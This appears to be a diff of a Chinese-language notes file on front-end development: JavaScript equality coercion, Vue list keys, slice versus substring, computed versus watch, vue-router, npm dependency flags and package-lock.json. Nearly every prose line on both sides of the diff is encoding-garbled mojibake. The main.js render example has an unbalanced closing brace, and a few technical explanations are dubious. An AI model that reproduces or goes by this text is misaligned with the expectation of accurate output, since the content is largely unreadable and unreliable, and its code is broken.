-true == 'true' ½á¹ûÊÇfalse ÒòÎª»á±äÎª 1 == 'true' ¾ÍÊÇ 1 == NaN,×÷ == ÅÐ¶ÏÊ±,Èç¹ûÒ»·½ÓÐÊýÖµÄÇÃ´¾Í»á°ÑÁíÍâÒ»·½Ò²×ªÎªÊýÖµ, trueÎª1,falseÎª0.
-¶ÔÓÚ¼Ó·¨À´Ëµ 1 + [] [].valueOf()»¹ÊÇ[] ,ËùÒÔ¾ÍÓÃtoStringµÃµ½'', 1+ ''¾ÍÊÇ'1',¶ø¶ÔÓÚ¼õ·¨À´Ëµ1 - [], [].valueOf()»¹ÊÇ[] ,ËùÒÔ¾ÍÓÃtoStringµÃµ½'', 1 - '', ''±äÎªnumberËùÒÔ¾ÍÊÇ1 -0»¹ÊÇ1
+é‚£ä¸ºä»€ä¹ˆnull == undefined è¿™ä¸ªæ˜¯è§„å®š,æ²¡æœ‰ä¸ºä»€ä¹ˆ... Number(null)ä¸º0 Number(undefined)ä¸ºNaN, NaN == NaN æ˜¯false
+true == 'true' ç»“æžœæ˜¯false å› ä¸ºä¼šå˜ä¸º 1 == 'true' å°±æ˜¯ 1 == NaN,ä½œ == åˆ¤æ–­æ—¶,å¦‚æžœä¸€æ–¹æœ‰æ•°å€¼é‚£ä¹ˆå°±ä¼šæŠŠå¦å¤–ä¸€æ–¹ä¹Ÿè½¬ä¸ºæ•°å€¼, trueä¸º1,falseä¸º0.
+å¯¹äºŽåŠ æ³•æ¥è¯´ 1 + [] [].valueOf()è¿˜æ˜¯[] ,æ‰€ä»¥å°±ç”¨toStringå¾—åˆ°'', 1+ ''å°±æ˜¯'1',è€Œå¯¹äºŽå‡æ³•æ¥è¯´1 - [], [].valueOf()è¿˜æ˜¯[] ,æ‰€ä»¥å°±ç”¨toStringå¾—åˆ°'', 1 - '', ''å˜ä¸ºnumberæ‰€ä»¥å°±æ˜¯1 -0è¿˜æ˜¯1
 
-Ò»°ã¶ÔÏóµÄvalueOfµÄÖµ¾ÍÊÇ±¾Éí,toStringÊÇ[Object,Object],Êý×éµÄtoStringÊÇ[1,2,3]±äÎª'1,2,3'
-{}µÄÖµÎª[Object,Object]±äÊýÖµÎªNaN,¿ÕÊý×éµÄÖµ×ªÎªÊý×ÖÎª0,ÓÐÒ»¸öÇÒÎªÊýÖµµÄÎªµ±Ç°ÊýÖµ,ÆäËû¶¼ÊÇNaN,ËùÒÔ[]==![]Îªtrue,{}==!{}Îªfalse,Òª×¢Òâ[]==[]¾ÍÊÇfalse,Í¬ÖÖÀàÐÍ²»ÐèÒª×ª»»,[]ÊÇÓÐÒ»¸öµØÖ·µÄÖµµÄ,![]×ÔÈ»¾ÍÊÇfalse ,±äÎª0,[]±äÎª''ÔÙ±äÎª0ËùÒÔÎªtrue,¶ø¶ÔÏó×îºóÊÇNaN==0ËùÒÔÊÇfalse,'a'±äÎªÊý×ÖÒ²ÊÇNaN
+ä¸€èˆ¬å¯¹è±¡çš„valueOfçš„å€¼å°±æ˜¯æœ¬èº«,toStringæ˜¯[Object,Object],æ•°ç»„çš„toStringæ˜¯[1,2,3]å˜ä¸º'1,2,3'
+{}çš„å€¼ä¸º[Object,Object]å˜æ•°å€¼ä¸ºNaN,ç©ºæ•°ç»„çš„å€¼è½¬ä¸ºæ•°å­—ä¸º0,æœ‰ä¸€ä¸ªä¸”ä¸ºæ•°å€¼çš„ä¸ºå½“å‰æ•°å€¼,å…¶ä»–éƒ½æ˜¯NaN,æ‰€ä»¥[]==![]ä¸ºtrue,{}==!{}ä¸ºfalse,è¦æ³¨æ„[]==[]å°±æ˜¯false,åŒç§ç±»åž‹ä¸éœ€è¦è½¬æ¢,[]æ˜¯æœ‰ä¸€ä¸ªåœ°å€çš„å€¼çš„,![]è‡ªç„¶å°±æ˜¯false ,å˜ä¸º0,[]å˜ä¸º''å†å˜ä¸º0æ‰€ä»¥ä¸ºtrue,è€Œå¯¹è±¡æœ€åŽæ˜¯NaN==0æ‰€ä»¥æ˜¯false,'a'å˜ä¸ºæ•°å­—ä¹Ÿæ˜¯NaN
 
-nullÓëundefinedÔÚÓëÆäËûÊýÏàµÈÔËËãÊ±²»½øÐÐÀàÐÍ×ª»»£¬
-nullÓëundefineµ¥¶ÀÓë±ðµÄÖµ±È½Ï¶¼Îªfalse,µ«undefinedÎªnullµÄÑÜÉú¶ÔÏó£¬ËùÒÔÁ½¸ö±È½ÏÎªtrue
+nullä¸Žundefinedåœ¨ä¸Žå…¶ä»–æ•°ç›¸ç­‰è¿ç®—æ—¶ä¸è¿›è¡Œç±»åž‹è½¬æ¢ï¼Œ
+nullä¸Žundefineå•ç‹¬ä¸Žåˆ«çš„å€¼æ¯”è¾ƒéƒ½ä¸ºfalse,ä½†undefinedä¸ºnullçš„è¡ç”Ÿå¯¹è±¡ï¼Œæ‰€ä»¥ä¸¤ä¸ªæ¯”è¾ƒä¸ºtrue
 
 0==null false 
 false == null false
 
-Êý×ÖÓë×Ö·û´®Ïà¼Ó½á¹ûÊÇ×Ö·û´®
-Êý×Ö×Ö·û´®ÓëÊý×ÖÏà¼õ  Êý×Ö×Ö·û´®»á±ä³ÉÊý×Ö£¬½á¹û¾ÍÊÇÊýÖµÁË
-·ÇÊýÖµ×Ö·û´®ÓëÊý×ÖÏà¼õ ½á¹ûÊÇNaN
-ÓëÊý×ÖÏà¼Ó¼õtrue×ª»¯Îª1£¬false×ª»¯Îª0
-Óë×Ö·û´®Ïà¼Ó¼õ²¼¶ûÖµ×ª»¯Îª×Ö·û´®
+æ•°å­—ä¸Žå­—ç¬¦ä¸²ç›¸åŠ ç»“æžœæ˜¯å­—ç¬¦ä¸²
+æ•°å­—å­—ç¬¦ä¸²ä¸Žæ•°å­—ç›¸å‡  æ•°å­—å­—ç¬¦ä¸²ä¼šå˜æˆæ•°å­—ï¼Œç»“æžœå°±æ˜¯æ•°å€¼äº†
+éžæ•°å€¼å­—ç¬¦ä¸²ä¸Žæ•°å­—ç›¸å‡ ç»“æžœæ˜¯NaN
+ä¸Žæ•°å­—ç›¸åŠ å‡trueè½¬åŒ–ä¸º1ï¼Œfalseè½¬åŒ–ä¸º0
+ä¸Žå­—ç¬¦ä¸²ç›¸åŠ å‡å¸ƒå°”å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²
 
-ÒòÎª²»´økeyÊ±½ÚµãÄÜ¹»¸´ÓÃ£¬Ê¡È¥ÁËÏú»Ù/´´½¨×é¼þµÄ¿ªÏú£¬Í¬Ê±Ö»ÐèÒªÐÞ¸ÄDOMÎÄ±¾ÄÚÈÝ¶ø²»ÊÇÒÆ³ý/Ìí¼Ó½Úµã£¬Õâ¾ÍÊÇÎÄµµÖÐËùËµµÄ¡°¿ÌÒâÒÀÀµÄ¬ÈÏÐÐÎªÒÔ»ñÈ¡ÐÔÄÜÉÏµÄÌáÉý¡±¡£
+å› ä¸ºä¸å¸¦keyæ—¶èŠ‚ç‚¹èƒ½å¤Ÿå¤ç”¨ï¼ŒçœåŽ»äº†é”€æ¯/åˆ›å»ºç»„ä»¶çš„å¼€é”€ï¼ŒåŒæ—¶åªéœ€è¦ä¿®æ”¹DOMæ–‡æœ¬å†…å®¹è€Œä¸æ˜¯ç§»é™¤/æ·»åŠ èŠ‚ç‚¹ï¼Œè¿™å°±æ˜¯æ–‡æ¡£ä¸­æ‰€è¯´çš„â€œåˆ»æ„ä¾èµ–é»˜è®¤è¡Œä¸ºä»¥èŽ·å–æ€§èƒ½ä¸Šçš„æå‡â€ã€‚
 
-¼ÈÈ»Èç´Ë£¬ÎªÊ²Ã´»¹Òª½¨Òé´økeyÄØ£¿ÒòÎªÕâÖÖÄ£Ê½Ö»ÊÊÓÃÓÚäÖÈ¾¼òµ¥µÄÎÞ×´Ì¬×é¼þ¡£¶ÔÓÚ´ó¶àÊý³¡¾°À´Ëµ£¬ÁÐ±í×é¼þ¶¼ÓÐ×Ô¼ºµÄ×´Ì¬¡£
+æ—¢ç„¶å¦‚æ­¤ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å»ºè®®å¸¦keyå‘¢ï¼Ÿå› ä¸ºè¿™ç§æ¨¡å¼åªé€‚ç”¨äºŽæ¸²æŸ“ç®€å•çš„æ— çŠ¶æ€ç»„ä»¶ã€‚å¯¹äºŽå¤§å¤šæ•°åœºæ™¯æ¥è¯´ï¼Œåˆ—è¡¨ç»„ä»¶éƒ½æœ‰è‡ªå·±çš„çŠ¶æ€ã€‚
 
-¾Ù¸öÀý×Ó£ºÒ»¸öÐÂÎÅÁÐ±í£¬¿Éµã»÷ÁÐ±íÏîÀ´½«Æä±ê¼ÇÎª"ÒÑ·ÃÎÊ"£¬¿ÉÍ¨¹ýtabÇÐ»»¡°ÓéÀÖÐÂÎÅ¡±»òÊÇ¡°Éç»áÐÂÎÅ¡±¡£
+ä¸¾ä¸ªä¾‹å­ï¼šä¸€ä¸ªæ–°é—»åˆ—è¡¨ï¼Œå¯ç‚¹å‡»åˆ—è¡¨é¡¹æ¥å°†å…¶æ ‡è®°ä¸º"å·²è®¿é—®"ï¼Œå¯é€šè¿‡tabåˆ‡æ¢â€œå¨±ä¹æ–°é—»â€æˆ–æ˜¯â€œç¤¾ä¼šæ–°é—»â€ã€‚
 
-²»´økeyÊôÐÔµÄÇé¿öÏÂ£¬ÔÚ¡°ÓéÀÖÐÂÎÅ¡±ÏÂÑ¡ÖÐµÚ¶þÏîÈ»ºóÇÐ»»µ½¡°Éç»áÐÂÎÅ¡±£¬"Éç»áÐÂÎÅ"ÀïµÄµÚ¶þÏîÒ²»áÊÇ±»Ñ¡ÖÐµÄ×´Ì¬£¬ÒòÎªÕâÀï¸´ÓÃÁË×é¼þ£¬±£ÁôÁËÖ®Ç°µÄ×´Ì¬¡£Òª½â¾öÕâ¸öÎÊÌâ£¬¿ÉÒÔÎªÁÐ±íÏî´øÉÏÐÂÎÅid×÷ÎªÎ¨Ò»key£¬ÄÇÃ´Ã¿´ÎäÖÈ¾ÁÐ±íÊ±¶¼»áÍêÈ«Ìæ»»ËùÓÐ×é¼þ£¬Ê¹ÆäÓµÓÐÕýÈ·×´Ì¬¡£
+ä¸å¸¦keyå±žæ€§çš„æƒ…å†µä¸‹ï¼Œåœ¨â€œå¨±ä¹æ–°é—»â€ä¸‹é€‰ä¸­ç¬¬äºŒé¡¹ç„¶åŽåˆ‡æ¢åˆ°â€œç¤¾ä¼šæ–°é—»â€ï¼Œ"ç¤¾ä¼šæ–°é—»"é‡Œçš„ç¬¬äºŒé¡¹ä¹Ÿä¼šæ˜¯è¢«é€‰ä¸­çš„çŠ¶æ€ï¼Œå› ä¸ºè¿™é‡Œå¤ç”¨äº†ç»„ä»¶ï¼Œä¿ç•™äº†ä¹‹å‰çš„çŠ¶æ€ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä¸ºåˆ—è¡¨é¡¹å¸¦ä¸Šæ–°é—»idä½œä¸ºå”¯ä¸€keyï¼Œé‚£ä¹ˆæ¯æ¬¡æ¸²æŸ“åˆ—è¡¨æ—¶éƒ½ä¼šå®Œå…¨æ›¿æ¢æ‰€æœ‰ç»„ä»¶ï¼Œä½¿å…¶æ‹¥æœ‰æ­£ç¡®çŠ¶æ€ã€‚
 
-ÕâÖ»ÊÇ¸ö¼òµ¥µÄÀý×Ó£¬Êµ¼ÊÓ¦ÓÃ»á¸ü¸´ÔÓ¡£´øÉÏÎ¨Ò»keyËäÈ»»áÔö¼Ó¿ªÏú£¬µ«ÊÇ¶ÔÓÚÓÃ»§À´Ëµ»ù±¾¸ÐÊÜ²»µ½²î¾à£¬¶øÇÒÄÜ±£Ö¤×é¼þ×´Ì¬ÕýÈ·£¬ÕâÓ¦¸Ã¾ÍÊÇÎªÊ²Ã´ÍÆ¼öÊ¹ÓÃÎ¨Ò»id×÷ÎªkeyµÄÔ­Òò¡£ÖÁÓÚ¾ßÌåÔõÃ´Ê¹ÓÃ£¬¾ÍÒª¸ù¾ÝÊµ¼ÊÇé¿öÀ´Ñ¡ÔñÁË¡£
+è¿™åªæ˜¯ä¸ªç®€å•çš„ä¾‹å­ï¼Œå®žé™…åº”ç”¨ä¼šæ›´å¤æ‚ã€‚å¸¦ä¸Šå”¯ä¸€keyè™½ç„¶ä¼šå¢žåŠ å¼€é”€ï¼Œä½†æ˜¯å¯¹äºŽç”¨æˆ·æ¥è¯´åŸºæœ¬æ„Ÿå—ä¸åˆ°å·®è·ï¼Œè€Œä¸”èƒ½ä¿è¯ç»„ä»¶çŠ¶æ€æ­£ç¡®ï¼Œè¿™åº”è¯¥å°±æ˜¯ä¸ºä»€ä¹ˆæŽ¨èä½¿ç”¨å”¯ä¸€idä½œä¸ºkeyçš„åŽŸå› ã€‚è‡³äºŽå…·ä½“æ€Žä¹ˆä½¿ç”¨ï¼Œå°±è¦æ ¹æ®å®žé™…æƒ…å†µæ¥é€‰æ‹©äº†ã€‚
 
-×Ö·û´®ÀïÃæµÄsliceºÍsubstring·½·¨µÄÖ÷ÒªÇø±ðÔÚÓÚ,sliceÀïÃæÈç¹û´«ÁË¸ºÊý,Ôò»á°Ñ¸ºÊýÈ¥¼ÓÉÏÕâ¸ö×Ö·û´®µÄ³¤¶È±ä³ÉÐÂµÄ²ÎÊý,¶øsubstring,Èç¹û´«Èë¸ºÊý»á±ä³É0(°üÀ¨NaN),Í¬Ê±substringÖÐÈç¹ûµÚÒ»¸ö²ÎÊý±ÈµÚ¶þ¸ö²ÎÊý´ó,Ôò»á×Ô¶¯»»Î»ÖÃ,substring(0,3)ºÍsubstring(3,0)½á¹ûÊÇÒ»ÑùµÄ,µ«ÊÇslice(3,0)ÔòÊÇ»áÖ±½Ó·µ»Ø¿Õ×Ö·û´®,slice(-1,-2)Ò²ÊÇÒ»Ñù,ËüµÈÓÚslice(length-1,length-2),Ç°Ãæ±ÈºóÃæ´ó·µ»Ø¿Õ×Ö·û´®''
+å­—ç¬¦ä¸²é‡Œé¢çš„sliceå’Œsubstringæ–¹æ³•çš„ä¸»è¦åŒºåˆ«åœ¨äºŽ,sliceé‡Œé¢å¦‚æžœä¼ äº†è´Ÿæ•°,åˆ™ä¼šæŠŠè´Ÿæ•°åŽ»åŠ ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦å˜æˆæ–°çš„å‚æ•°,è€Œsubstring,å¦‚æžœä¼ å…¥è´Ÿæ•°ä¼šå˜æˆ0(åŒ…æ‹¬NaN),åŒæ—¶substringä¸­å¦‚æžœç¬¬ä¸€ä¸ªå‚æ•°æ¯”ç¬¬äºŒä¸ªå‚æ•°å¤§,åˆ™ä¼šè‡ªåŠ¨æ¢ä½ç½®,substring(0,3)å’Œsubstring(3,0)ç»“æžœæ˜¯ä¸€æ ·çš„,ä½†æ˜¯slice(3,0)åˆ™æ˜¯ä¼šç›´æŽ¥è¿”å›žç©ºå­—ç¬¦ä¸²,slice(-1,-2)ä¹Ÿæ˜¯ä¸€æ ·,å®ƒç­‰äºŽslice(length-1,length-2),å‰é¢æ¯”åŽé¢å¤§è¿”å›žç©ºå­—ç¬¦ä¸²''
 
-computed¶à¸öÓ°ÏìÒ»¸ö,×ß»º´æ,computed Ò»¸ösumScore,return this.math+this.english.ÊýÑ§ºÍÓ¢Óï±ä»¯¶¼»á¸Ä±äsumScoreµÄÖµ
-watch¼àÌýÒ»¸öÖµ,¿ÉÒÔÒ»¸öÓ°Ïì¶à¸ö,±ÈÈç¼àÌýÊýÑ§³É¼¨ÊÇ·ñ±ä»¯,Èç¹û±ä»¯,ÄÇÃ´×Ü·Ö¸ú×Å±ä»¯,»¹¿ÉÒÔ¸Ä±äÆäËûµÄÖµ,²¢ÇÒÓÐÁ½¸ö²ÎÊýÒ»¸öÊÇÐÂµÄÖµÒ»¸öÊÇ¾ÉµÄÖµ.
+computedå¤šä¸ªå½±å“ä¸€ä¸ª,èµ°ç¼“å­˜,computed ä¸€ä¸ªsumScore,return this.math+this.english.æ•°å­¦å’Œè‹±è¯­å˜åŒ–éƒ½ä¼šæ”¹å˜sumScoreçš„å€¼
+watchç›‘å¬ä¸€ä¸ªå€¼,å¯ä»¥ä¸€ä¸ªå½±å“å¤šä¸ª,æ¯”å¦‚ç›‘å¬æ•°å­¦æˆç»©æ˜¯å¦å˜åŒ–,å¦‚æžœå˜åŒ–,é‚£ä¹ˆæ€»åˆ†è·Ÿç€å˜åŒ–,è¿˜å¯ä»¥æ”¹å˜å…¶ä»–çš„å€¼,å¹¶ä¸”æœ‰ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæ˜¯æ–°çš„å€¼ä¸€ä¸ªæ˜¯æ—§çš„å€¼.
 
-for...in±éÀúÒ»¸ö¶ÔÏó,±éÀúµÄÊÇ¼ü(key),for...of±éÀúÒ»¸öÊý×é»òÕßmap,set±ØÐëÒªÓÐiterableµü´úÆ÷µÄ¶ÔÏó.±éÀúµÄÊÇÖµ(value)
-¶øvueÀïÃæµÄv-for Èç¹û±éÀúÊý×éÊÇ(item,index) in array ,
-±éÀú¶ÔÏóÔòÊÇ(value,key,index) in object
+for...inéåŽ†ä¸€ä¸ªå¯¹è±¡,éåŽ†çš„æ˜¯é”®(key),for...oféåŽ†ä¸€ä¸ªæ•°ç»„æˆ–è€…map,setå¿…é¡»è¦æœ‰iterableè¿­ä»£å™¨çš„å¯¹è±¡.éåŽ†çš„æ˜¯å€¼(value)
+è€Œvueé‡Œé¢çš„v-for å¦‚æžœéåŽ†æ•°ç»„æ˜¯(item,index) in array ,
+éåŽ†å¯¹è±¡åˆ™æ˜¯(value,key,index) in object
 
-routesÊÇnew VueRouter´«ÈëÒ»¸ö¶ÔÏóÀïÃæµÄÒ»¸öÊôÐÔ,routesÊÇÒ»¸öÊý×é,Êý×éµÄ³ÉÔ±ÊÇ¶ÔÏó,¶ÔÏóÀïÃæÓÐpathºÍcomponentÊôÐÔ.
-$routerÊÇÓÃÀ´¿ØÖÆÂ·ÓÉµÄ,¿ÉÒÔ¿ØÖÆÂ·ÓÉµÄÌø×ªÓÐgo,push,replace·½·¨
-$routeÔòÊÇ¿ÉÒÔ»ñÈ¡´«ÈëÂ·ÓÉµÄÇëÇó²ÎÊýÀýÈç<router-link :to="'/news/sport/detail/' + sport.id">,ÄÇÃ´ÎÒ¿ÉÒÔthis.$route.params.idÀ´»ñÈ¡,idÔõÃ´À´µÄ,Õâ¸öÊÇÂ·ÓÉÀïÃæµÄpathÀ´ÉèÖÃµÄ
-path: '/news/sport/detail/:id',´Ë´¦Ã°ºÅ¾Í±íÊ¾ÊÇ¶¯Ì¬Â·¾¶,Í¨¹ý:id´«Êä,ÓÃÇ°Ãæ$route½ÓÊÕ,µ«ÊÇÊÇ×Ö·û´®.routerlinkÀïÃæ¾ÍÏàµ±ÓÚ¸ø:id¸³ÖµÁË
+routesæ˜¯new VueRouterä¼ å…¥ä¸€ä¸ªå¯¹è±¡é‡Œé¢çš„ä¸€ä¸ªå±žæ€§,routesæ˜¯ä¸€ä¸ªæ•°ç»„,æ•°ç»„çš„æˆå‘˜æ˜¯å¯¹è±¡,å¯¹è±¡é‡Œé¢æœ‰pathå’Œcomponentå±žæ€§.
+$routeræ˜¯ç”¨æ¥æŽ§åˆ¶è·¯ç”±çš„,å¯ä»¥æŽ§åˆ¶è·¯ç”±çš„è·³è½¬æœ‰go,push,replaceæ–¹æ³•
+$routeåˆ™æ˜¯å¯ä»¥èŽ·å–ä¼ å…¥è·¯ç”±çš„è¯·æ±‚å‚æ•°ä¾‹å¦‚<router-link :to="'/news/sport/detail/' + sport.id">,é‚£ä¹ˆæˆ‘å¯ä»¥this.$route.params.idæ¥èŽ·å–,idæ€Žä¹ˆæ¥çš„,è¿™ä¸ªæ˜¯è·¯ç”±é‡Œé¢çš„pathæ¥è®¾ç½®çš„
+path: '/news/sport/detail/:id',æ­¤å¤„å†’å·å°±è¡¨ç¤ºæ˜¯åŠ¨æ€è·¯å¾„,é€šè¿‡:idä¼ è¾“,ç”¨å‰é¢$routeæŽ¥æ”¶,ä½†æ˜¯æ˜¯å­—ç¬¦ä¸².routerlinké‡Œé¢å°±ç›¸å½“äºŽç»™:idèµ‹å€¼äº†
 
-pushºÍreplaceµÄÇø±ð¾ÍÊÇpushÏàµ±ÓÚÍùÔ­À´µÄÕ»ÀïÃæÑ¹Õ»,¶øreplaceÔòÊÇÖØÐÂ´´ÁËÒ»¸öÕ»,Ò»¸ö¿ÉÒÔÍ¨¹ý·µ»Ø»Øµ½ÉÏÒ»²½Ò»¸ö²»ÐÐ,¶øÇÒÕâÁ½¸öÊÇ²»Í¬µÄÕ»,Èç¹ûpushÀïÃæÓÐÄÚÈÝ,Äãµã»÷·µ»Ø»¹ÊÇ¿ÉÒÔ·µ»ØµÄ,µ«ÊÇºóÕßÔò²»ÐÐ,backºÍgo(-1)ÊÇÒ»ÑùµÄ
+pushå’Œreplaceçš„åŒºåˆ«å°±æ˜¯pushç›¸å½“äºŽå¾€åŽŸæ¥çš„æ ˆé‡Œé¢åŽ‹æ ˆ,è€Œreplaceåˆ™æ˜¯é‡æ–°åˆ›äº†ä¸€ä¸ªæ ˆ,ä¸€ä¸ªå¯ä»¥é€šè¿‡è¿”å›žå›žåˆ°ä¸Šä¸€æ­¥ä¸€ä¸ªä¸è¡Œ,è€Œä¸”è¿™ä¸¤ä¸ªæ˜¯ä¸åŒçš„æ ˆ,å¦‚æžœpushé‡Œé¢æœ‰å†…å®¹,ä½ ç‚¹å‡»è¿”å›žè¿˜æ˜¯å¯ä»¥è¿”å›žçš„,ä½†æ˜¯åŽè€…åˆ™ä¸è¡Œ,backå’Œgo(-1)æ˜¯ä¸€æ ·çš„
 
--S¾ÍÊÇ¨CsaveµÄ¼òÐ´¡£dependenciesÊÇÊ²Ã´ÄØ£¿ Éú²ú»·¾³¡£
--D¾ÍÊÇ¨Csave-devµÄ¼òÐ´¡£ devdependenciesÊÇÊ²Ã´ÄØ£¿ ¿ª·¢»·¾³¡£
+-Så°±æ˜¯â€“saveçš„ç®€å†™ã€‚dependenciesæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ ç”Ÿäº§çŽ¯å¢ƒã€‚
+-Då°±æ˜¯â€“save-devçš„ç®€å†™ã€‚ devdependenciesæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å¼€å‘çŽ¯å¢ƒã€‚
 
 
-package.json ÎÄ¼þÖ»ÄÜËø¶¨´ó°æ±¾£¬Ò²¾ÍÊÇ°æ±¾ºÅµÄµÚÒ»Î»£¬²¢²»ÄÜËø¶¨ºóÃæµÄÐ¡°æ±¾£¬`npm install` ¶¼ÊÇÀ­È¡µÄ¸Ã´ó°æ±¾ÏÂµÄ×îÐÂµÄ°æ±¾£¬ÎªÁËÎÈ¶¨ÐÔ¿¼ÂÇÎÒÃÇ¼¸ºõÊÇ²»¸ÒËæÒâÉý¼¶ÒÀÀµ°üµÄ£¬Õâ½«µ¼ÖÂ¶à³öÀ´ºÜ¶à¹¤×÷Á¿£¬²âÊÔ/ÊÊÅäµÈ£¬ËùÒÔ package-lock.json ÎÄ¼þ³öÀ´ÁË£¬µ±ÄãÃ¿´Î°²×°Ò»¸öÒÀÀµµÄÊ±ºò¾ÍËø¶¨ÔÚÄã°²×°µÄÕâ¸ö°æ±¾¡£
-ÔÚÒÔÇ°¿ÉÄÜ¾ÍÊÇÖ±½Ó¸Ä package.json ÀïÃæµÄ°æ±¾£¬È»ºóÔÙ `npm install` ÁË£¬µ«ÊÇ 5 °æ±¾ºó¾Í²»Ö§³ÖÕâÑù×öÁË£¬ÒòÎª°æ±¾ÒÑ¾­Ëø¶¨ÔÚ package-lock.json ÀïÁË£¬ËùÒÔÎÒÃÇÖ»ÄÜ `npm install xxx@x.x.x` ÕâÑùÈ¥¸üÐÂÎÒÃÇµÄÒÀÀµ£¬È»ºó package-lock.json Ò²ÄÜËæÖ®¸üÐÂ¡£
+package.json æ–‡ä»¶åªèƒ½é”å®šå¤§ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ï¼Œå¹¶ä¸èƒ½é”å®šåŽé¢çš„å°ç‰ˆæœ¬ï¼Œ`npm install` éƒ½æ˜¯æ‹‰å–çš„è¯¥å¤§ç‰ˆæœ¬ä¸‹çš„æœ€æ–°çš„ç‰ˆæœ¬ï¼Œä¸ºäº†ç¨³å®šæ€§è€ƒè™‘æˆ‘ä»¬å‡ ä¹Žæ˜¯ä¸æ•¢éšæ„å‡çº§ä¾èµ–åŒ…çš„ï¼Œè¿™å°†å¯¼è‡´å¤šå‡ºæ¥å¾ˆå¤šå·¥ä½œé‡ï¼Œæµ‹è¯•/é€‚é…ç­‰ï¼Œæ‰€ä»¥ package-lock.json æ–‡ä»¶å‡ºæ¥äº†ï¼Œå½“ä½ æ¯æ¬¡å®‰è£…ä¸€ä¸ªä¾èµ–çš„æ—¶å€™å°±é”å®šåœ¨ä½ å®‰è£…çš„è¿™ä¸ªç‰ˆæœ¬ã€‚
+åœ¨ä»¥å‰å¯èƒ½å°±æ˜¯ç›´æŽ¥æ”¹ package.json é‡Œé¢çš„ç‰ˆæœ¬ï¼Œç„¶åŽå† `npm install` äº†ï¼Œä½†æ˜¯ 5 ç‰ˆæœ¬åŽå°±ä¸æ”¯æŒè¿™æ ·åšäº†ï¼Œå› ä¸ºç‰ˆæœ¬å·²ç»é”å®šåœ¨ package-lock.json é‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ `npm install xxx@x.x.x` è¿™æ ·åŽ»æ›´æ–°æˆ‘ä»¬çš„ä¾èµ–ï¼Œç„¶åŽ package-lock.json ä¹Ÿèƒ½éšä¹‹æ›´æ–°ã€‚
 
-ÄÇÈç¹ûÎÒÃÇ°²×°Ê±µÄ°üÓÐbug£¬ºóÃæÐèÒª¸üÐÂÔõÃ´°ì£¿
-ÔÚÒÔÇ°¿ÉÄÜ¾ÍÊÇÖ±½Ó¸Ä package.json ÀïÃæµÄ°æ±¾£¬È»ºóÔÙ `npm install` ÁË£¬µ«ÊÇ 5 °æ±¾ºó¾Í²»Ö§³ÖÕâÑù×öÁË£¬ÒòÎª°æ±¾ÒÑ¾­Ëø¶¨ÔÚ package-lock.json ÀïÁË£¬ËùÒÔÎÒÃÇÖ»ÄÜ `npm install xxx@x.x.x` ÕâÑùÈ¥¸üÐÂÎÒÃÇµÄÒÀÀµ£¬È»ºó package-lock.json Ò²ÄÜËæÖ®¸üÐÂ¡£
+é‚£å¦‚æžœæˆ‘ä»¬å®‰è£…æ—¶çš„åŒ…æœ‰bugï¼ŒåŽé¢éœ€è¦æ›´æ–°æ€Žä¹ˆåŠžï¼Ÿ
+åœ¨ä»¥å‰å¯èƒ½å°±æ˜¯ç›´æŽ¥æ”¹ package.json é‡Œé¢çš„ç‰ˆæœ¬ï¼Œç„¶åŽå† `npm install` äº†ï¼Œä½†æ˜¯ 5 ç‰ˆæœ¬åŽå°±ä¸æ”¯æŒè¿™æ ·åšäº†ï¼Œå› ä¸ºç‰ˆæœ¬å·²ç»é”å®šåœ¨ package-lock.json é‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ `npm install xxx@x.x.x` è¿™æ ·åŽ»æ›´æ–°æˆ‘ä»¬çš„ä¾èµ–ï¼Œç„¶åŽ package-lock.json ä¹Ÿèƒ½éšä¹‹æ›´æ–°ã€‚
 
-Õâ¸ö¾ÍÊÇmain.jsÄÚÈÝ,¶øApp.vue¾ÍÊÇÏàµ±ÓÚÊÇÕû¸öÒ³ÃæÁË
+è¿™ä¸ªå°±æ˜¯main.jså†…å®¹,è€ŒApp.vueå°±æ˜¯ç›¸å½“äºŽæ˜¯æ•´ä¸ªé¡µé¢äº†
 new Vue({
 el: '#app',
-//Vue¸ùÊµÀýÖÐÓÐtemplateÑ¡ÏîÒýÓÃÁË×é¼þºó£¬È»ºó»á°ÑtemplateÖÐµÄäÖÈ¾½á¹ûÌæ»»µô #app ±êÊ¶µÄÔªËØ¡£
+//Vueæ ¹å®žä¾‹ä¸­æœ‰templateé€‰é¡¹å¼•ç”¨äº†ç»„ä»¶åŽï¼Œç„¶åŽä¼šæŠŠtemplateä¸­çš„æ¸²æŸ“ç»“æžœæ›¿æ¢æŽ‰ #app æ ‡è¯†çš„å…ƒç´ ã€‚
 template: '<app></app>',
 components: {
-App //µÈ¼ÛÓÚ App: App
+App //ç­‰ä»·äºŽ App: App
 }
-})Ò²¿ÉÒÔÐ´³ÉÏÂÃæ
+})ä¹Ÿå¯ä»¥å†™æˆä¸‹é¢
 new Vue({
 el: '#app',
-//Vue¸ùÊµÀýÖÐÓÐtemplateÑ¡ÏîÒýÓÃÁË×é¼þºó£¬È»ºó»á°ÑtemplateÖÐµÄäÖÈ¾½á¹ûÌæ»»µô #app ±êÊ¶µÄÔªËØ¡£
+//Vueæ ¹å®žä¾‹ä¸­æœ‰templateé€‰é¡¹å¼•ç”¨äº†ç»„ä»¶åŽï¼Œç„¶åŽä¼šæŠŠtemplateä¸­çš„æ¸²æŸ“ç»“æžœæ›¿æ¢æŽ‰ #app æ ‡è¯†çš„å…ƒç´ ã€‚
 render : h=> h(App)
 }
 })
 
-µ±×¢²á×é¼þ (»òÕß prop) Ê±£¬¿ÉÒÔÊ¹ÓÃ kebab-case (¶ÌºáÏß·Ö¸ôÃüÃû)¡¢camelCase (ÍÕ·åÊ½ÃüÃû) »ò PascalCase (µ¥´ÊÊ××ÖÄ¸´óÐ´ÃüÃû)¡£
